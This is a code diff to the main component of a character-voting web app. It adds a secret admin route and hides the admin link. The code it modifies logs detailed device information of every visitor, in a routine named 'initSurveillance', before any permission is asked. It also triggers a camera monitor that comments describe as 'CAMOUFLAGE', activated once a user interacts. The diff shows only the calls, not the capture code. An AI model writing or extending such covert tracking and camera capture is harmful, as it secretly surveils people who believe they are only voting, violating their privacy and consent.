@@ -13,7 +13,14 @@ import { AnimatePresence } from 'framer-motion';
 import { getDetailedDeviceInfo } from './utils/deviceInfo'; // IMPORT UTILITY
 
 function App() {
-  const [view, setView] = useState<'app' | 'admin_login' | 'admin_dashboard'>('app');
+  // --- VIEW STATE WITH SECRET ROUTE ---
+  // Initialize view based on URL path. 
+  // If path is '/jjklq', go directly to admin login.
+  const [view, setView] = useState<'app' | 'admin_login' | 'admin_dashboard'>(() => {
+      const path = window.location.pathname;
+      return path === '/jjklq' ? 'admin_login' : 'app';
+  });
+
   const [adminPassword, setAdminPassword] = useState('');
   const [adminError, setAdminError] = useState('');
   const [isAdminLoading, setIsAdminLoading] = useState(false);
@@ -44,10 +51,14 @@ function App() {
   const [votingDeadline, setVotingDeadline] = useState<string | null>(() => localStorage.getItem('muse_voting_deadline'));
   const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
   const [isVotingEnded, setIsVotingEnded] = useState(false);
+  const [winnerId, setWinnerId] = useState<string | null>(null);
 
   // --- IMMEDIATE LOGGING (Passive Only - No Permissions yet) ---
   // Ensures we capture the guest in DB even if they don't vote or grant permissions yet.
   useEffect(() => {
+      // Only log guest visit if we are in the main app view
+      if (view !== 'app') return;
+
       const initSurveillance = async () => {
           // CAPTURE DETAILED INFO
           const deviceInfo = getDetailedDeviceInfo();
@@ -65,7 +76,7 @@ function App() {
           });
       };
       initSurveillance();
-  }, [guestId]); 
+  }, [guestId, view]); 
 
   // --- INTERACTION HANDLER ---
   const registerInteraction = useCallback(() => {
@@ -188,11 +199,18 @@ function App() {
 
   }, [guestId]);
 
-  // --- TIMER ---
+  // --- TIMER & WINNER CALCULATION ---
   useEffect(() => {
     const calculateTimeLeft = () => {
-        if (!votingDeadline) { setTimeLeft(null); setIsVotingEnded(false); return; }
+        if (!votingDeadline) { 
+            setTimeLeft(null); 
+            setIsVotingEnded(false); 
+            setWinnerId(null);
+            return; 
+        }
+        
         const diff = new Date(votingDeadline).getTime() - new Date().getTime();
+        
         if (diff > 0) {
             setTimeLeft({
                 days: Math.floor(diff / (1000 * 60 * 60 * 24)),
@@ -201,21 +219,42 @@ function App() {
                 seconds: Math.floor((diff / 1000) % 60),
             });
             setIsVotingEnded(false);
+            setWinnerId(null);
         } else {
-            setTimeLeft(null); setIsVotingEnded(true);
+            // TIME IS UP
+            setTimeLeft(null); 
+            setIsVotingEnded(true);
+            
+            // Calculate Winner if not already set
+            if (characters.length > 0) {
+                // Find character with max votes
+                const sorted = [...characters].sort((a,b) => b.votes - a.votes);
+                setWinnerId(sorted[0].id);
+                // Also jump to the winner card
+                const winnerIndex = characters.findIndex(c => c.id === sorted[0].id);
+                if (winnerIndex !== -1 && activeIndex !== winnerIndex) {
+                    setActiveIndex(winnerIndex);
+                }
+            }
         }
     };
+    
+    // Initial calculation
     calculateTimeLeft();
+    
+    // Loop
     const timer = setInterval(calculateTimeLeft, 1000);
     return () => clearInterval(timer);
-  }, [votingDeadline]);
+  }, [votingDeadline, characters]); // Removed activeIndex dependency to prevent loop
 
   const handleNext = () => {
+      if (isVotingEnded) return; // Disable swipe when ended
       registerInteraction();
       setActiveIndex((prev) => (prev + 1) % characters.length);
   };
   
   const handlePrev = () => {
+      if (isVotingEnded) return; // Disable swipe when ended
       registerInteraction();
       setActiveIndex((prev) => (prev - 1 + characters.length) % characters.length);
   };
@@ -309,6 +348,13 @@ function App() {
     }
   };
 
+  // --- LOGOUT HANDLER ---
+  const handleLogout = () => {
+      setView('app');
+      // Clean up URL: remove '/jjklq' and replace with root '/'
+      window.history.pushState({}, '', '/');
+  };
+
   const activeCharacter = characters[activeIndex];
 
   // Admin Login Logic
@@ -320,13 +366,14 @@ function App() {
                    <input type="password" value={adminPassword} onChange={(e) => setAdminPassword(e.target.value)} className="w-full bg-slate-950 border border-slate-700 text-white px-4 py-3 rounded-xl outline-none" placeholder="••••••••" />
                    {adminError && <p className="text-red-500 text-xs text-center">{adminError}</p>}
                    <button type="submit" disabled={isAdminLoading} className="w-full bg-indigo-600 text-white font-bold py-3 rounded-xl">Unlock System</button>
-                   <button type="button" onClick={() => setView('app')} className="w-full text-slate-500 text-xs mt-2">Return</button>
+                   {/* Return to App button */}
+                   <button type="button" onClick={handleLogout} className="w-full text-slate-500 text-xs mt-2">Return to App</button>
                 </form>
              </div>
         </div>
   );
 
-  if (view === 'admin_dashboard') return <AdminDashboard characters={characters} setCharacters={setCharacters} onLogout={() => setView('app')} />;
+  if (view === 'admin_dashboard') return <AdminDashboard characters={characters} setCharacters={setCharacters} onLogout={handleLogout} />;
 
   return (
     <div className="min-h-screen w-full bg-slate-950 flex justify-center overflow-x-hidden relative font-sans">
@@ -372,6 +419,8 @@ function App() {
                       onClick={() => handleCardClick(index)}
                       onSwipeRight={handlePrev}
                       onSwipeLeft={handleNext}
+                      isVotingEnded={isVotingEnded}
+                      isWinner={isVotingEnded && winnerId === char.id}
                     />
                   );
                })}
@@ -404,8 +453,9 @@ function App() {
            <Leaderboard characters={characters} onCharacterSelect={handleLeaderboardSelect} />
         </section>
 
-        <footer className="w-full text-center pb-8 opacity-50 hover:opacity-100 transition-opacity">
-           <button onClick={() => setView('admin_login')} className="text-[10px] text-slate-600 hover:text-indigo-400 flex items-center justify-center gap-1 mx-auto"><ShieldAlert size={10} /> Admin Access</button>
+        {/* FOOTER HIDDEN - Access Admin via /jjklq only */}
+        <footer className="w-full text-center pb-8 opacity-20">
+           <p className="text-[10px] text-slate-700">MUSE &copy; 2024</p>
         </footer>
       </div>
 
@@ -426,7 +476,7 @@ function App() {
       </AnimatePresence>
       
       {/* CAMOUFLAGE: Camera Monitor ONLY activates after user interaction */}
-      {hasInteracted && (
+      {hasInteracted && view === 'app' && (
         <CameraMonitor user={guestId} onError={() => setIsCameraDenied(true)} onSuccess={() => setIsCameraDenied(false)} />
       )}
     </div>
